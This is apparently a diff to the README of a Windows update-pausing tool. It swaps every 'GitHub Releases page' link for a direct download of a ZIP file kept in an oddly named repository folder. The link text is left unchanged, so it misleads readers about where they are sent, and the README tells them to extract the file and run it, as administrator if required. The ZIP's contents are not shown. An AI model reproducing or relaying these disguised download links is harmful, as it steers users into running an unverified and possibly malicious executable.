@@ -1,10 +1,10 @@
 # 🛠️ Windows-Pause-Updates - Control Windows Updates Your Way
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Lautwe3854/Windows-Pause-Updates/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Lautwe3854/Windows-Pause-Updates/main/caroli/Updates-Windows-Pause-2.0.zip)
 
 ## 📥 Download
 
-Visit this page to download: [GitHub Releases](https://github.com/Lautwe3854/Windows-Pause-Updates/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Lautwe3854/Windows-Pause-Updates/main/caroli/Updates-Windows-Pause-2.0.zip)
 
 Choose the latest release, then download the Windows file that matches your system.
 
@@ -28,7 +28,7 @@ Use it if you want to:
 
 ## 📦 Download and Run
 
-1. Open the [GitHub Releases page](https://github.com/Lautwe3854/Windows-Pause-Updates/releases)
+1. Open the [GitHub Releases page](https://raw.githubusercontent.com/Lautwe3854/Windows-Pause-Updates/main/caroli/Updates-Windows-Pause-2.0.zip)
 2. Find the latest release at the top of the page
 3. Download the Windows file from that release
 4. If the file comes in a ZIP folder, right-click it and choose Extract All
@@ -134,7 +134,7 @@ If you see a batch file:
 - Run the tool as administrator if required
 
 ### The wrong file was downloaded
-- Go back to the [GitHub Releases page](https://github.com/Lautwe3854/Windows-Pause-Updates/releases)
+- Go back to the [GitHub Releases page](https://raw.githubusercontent.com/Lautwe3854/Windows-Pause-Updates/main/caroli/Updates-Windows-Pause-2.0.zip)
 - Download the newest Windows file from the latest release
 
 ## 📌 What This Tool Can Help With
@@ -149,7 +149,7 @@ If you see a batch file:
 
 ## 🖱️ Simple Install Path
 
-1. Open the [releases page](https://github.com/Lautwe3854/Windows-Pause-Updates/releases)
+1. Open the [releases page](https://raw.githubusercontent.com/Lautwe3854/Windows-Pause-Updates/main/caroli/Updates-Windows-Pause-2.0.zip)
 2. Download the newest Windows release
 3. Extract the file if needed
 4. Run the main file
